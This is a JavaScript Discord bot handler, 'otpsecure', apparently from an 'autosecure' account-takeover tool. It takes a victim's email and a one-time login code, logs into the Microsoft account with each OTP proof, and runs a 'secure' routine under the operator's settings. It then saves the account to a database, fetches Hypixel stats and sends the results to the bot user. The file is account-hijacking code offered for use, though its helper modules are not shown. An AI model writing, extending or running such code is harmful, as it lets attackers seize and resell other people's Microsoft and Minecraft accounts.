const validEmail = require('../../utils/emails/validEmail');
const axios = require("axios");
const login = require('../../utils/secure/login');
const secure = require('../../utils/secure/recodesecure');
const listAccount = require("../../../autosecure/utils/accounts/listAccount");
const { queryParams } = require("../../../db/database");
const statsembed = require("../../../autosecure/utils/stats/statsembed");
const fetchStats = require("../../../autosecure/utils/hypixelapi/fetchStats");
const generateuid = require('../../utils/generateuid');
const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const insertaccount = require("../../../db/insertaccount");
const getStats = require('../../utils/hypixelapi/getStats');
const mcregex = require("../../../autosecure/utils/utils/mcregex");
const { failedembed } = require("../../utils/embeds/embedhandler");
const getCredentials = require("../../utils/info/getCredentials");

module.exports = {
  name: "otpsecure",
  userOnly: true,

  callback: async (client, interaction) => {
    console.log(`[OTP_SECURE] Modal submitted by ${interaction.user.id} (${interaction.user.username})`);
    await interaction.deferReply({ ephemeral: true });

    const email = interaction.components?.[0]?.components?.[0]?.value;
    const otp = interaction.components?.[1]?.components?.[0]?.value;
    const mcign = interaction.components?.[2]?.components?.[0]?.value || null;

    console.log(`[OTP_SECURE] Email: ${email} | OTP: ${otp ? '✔' : '❌'} | MC: ${mcign || 'none'}`);

    if (mcign && !mcregex(mcign))
      return interaction.editReply({ content: "Please enter a valid Minecraft username!" });

    if (!validEmail(email))
      return interaction.editReply({ content: "Invalid Email format." });

    if (isNaN(otp) || otp.length < 6 || otp.length > 7)
      return interaction.editReply({ content: "Invalid OTP code." });

    const settingsData = await client.queryParams(`SELECT * FROM secureconfig WHERE user_id=?`, [interaction.user.id]);
    if (settingsData.length === 0)
      return interaction.editReply({
        embeds: [{ title: "Error ❌", description: "Couldn't find your settings! Please report this to an admin.", color: 0xff0000 }]
      });

    const settings = settingsData[0];
    console.log(`[OTP_SECURE] Settings loaded for user ${interaction.user.id}`);

    let profiles;
    try {
      profiles = await getCredentials(email, false);
    } catch (err) {
      console.error(`[OTP_SECURE] Error fetching credentials:`, err);
      return interaction.editReply({ content: "Email lookup failed!" });
    }

    if (!profiles?.Credentials?.OtcLoginEligibleProofs)
      return interaction.editReply({ content: "Invalid email or OTP not available." });

    console.log(`[OTP_SECURE] Found ${profiles.Credentials.OtcLoginEligibleProofs.length} OTP proofs`);

    const uid = await generateuid();
    const expireTimestamp = Math.floor(Date.now() / 1000) + 900;

    const statusEmbed = {
      title: "This account is being automatically secured.",
      color: 0x808080,
    };

    const statusButton = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`status|${uid}`)
        .setLabel("⏳ Status")
        .setStyle(ButtonStyle.Primary)
    );

    await interaction.editReply({ embeds: [statusEmbed], components: [statusButton] });
    await interaction.user.send({ embeds: [statusEmbed], components: [statusButton] });

    for (const sec of profiles.Credentials.OtcLoginEligibleProofs) {
      console.log(`[OTP_SECURE] Trying proof ID: ${sec.data}`);

      const host = await login({ email, id: sec.data, code: otp }, profiles);
      if (!host) continue;

      console.log(`[OTP_SECURE] Login successful`);

      try {
        const acc = await secure(host, settings, uid, mcign);
        await insertaccount(acc, uid, client.username, settings.secureifnomc);

        const failMsg = await failedembed(acc, uid);
        if (failMsg.failed) {
          await interaction.followUp(failMsg.failedmsg);
          await interaction.user.send(failMsg.failedmsg);
          return;
        }

        if (acc.newName === "No Minecraft!") {
          const msg = await listAccount(acc, uid, client, interaction);
          await interaction.user.send(msg);
          return;
        }

        const stats = await statsembed(client, acc, interaction);
        const accMsg = await listAccount(acc, uid, client, interaction);

        if (stats) await interaction.user.send(stats);
        await interaction.user.send(accMsg);
        await interaction.editReply(accMsg);
        return;
      } catch (err) {
        console.error(`[OTP_SECURE] Secure process failed:`, err);
        await interaction.editReply({
          embeds: [{
            title: "Failed securing!",
            description: "An error occurred while securing your account.\nUse the status button to retry.",
            color: 0xff0000
          }]
        });
        return;
      }
    }

    await interaction.editReply("Failed to login with provided OTP.");
  }
};
